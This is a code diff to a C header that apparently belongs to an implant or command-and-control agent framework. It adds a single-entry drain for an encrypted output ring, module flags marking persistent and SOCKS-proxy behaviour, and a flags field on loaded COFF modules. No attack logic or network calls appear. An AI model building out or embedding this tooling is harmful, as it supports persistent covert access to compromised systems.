@@ -160,6 +160,12 @@ BOOL output_write(OUTPUT_RING *ring, const BYTE *data, DWORD len, DWORD type);
 DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len);
 
 /**
+ * Drain exactly one output entry from the ring into a plaintext destination.
+ * Returns the payload length drained, or 0 if no complete entry fits.
+ */
+DWORD output_drain_one(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len);
+
+/**
  * Reset the output ring buffer to empty state with a new key.
  */
 void output_reset(OUTPUT_RING *ring);
@@ -187,6 +193,10 @@ DWORD output_available(const OUTPUT_RING *ring);
 #define MODULE_STATUS_COMPLETED  2
 #define MODULE_STATUS_CRASHED    3
 #define MODULE_STATUS_WIPED      4
+
+/* Module flags */
+#define MODULE_FLAG_PERSISTENT   0x00000001
+#define MODULE_FLAG_SOCKS        0x00000002
 
 /* COFF relocation types (IMAGE_REL_AMD64_*) */
 #define IMAGE_REL_AMD64_ABSOLUTE  0x0000
@@ -309,6 +319,7 @@ typedef struct _LOADED_MODULE {
     MODULE_BUS_API *bus_api;         /* Bus API pointer for this module */
     BYTE           *args;            /* Heap-owned module args          */
     DWORD           args_len;        /* Module args length              */
+    DWORD           flags;           /* MODULE_FLAG_* runtime behavior  */
 } LOADED_MODULE;
 
 /* ------------------------------------------------------------------ */
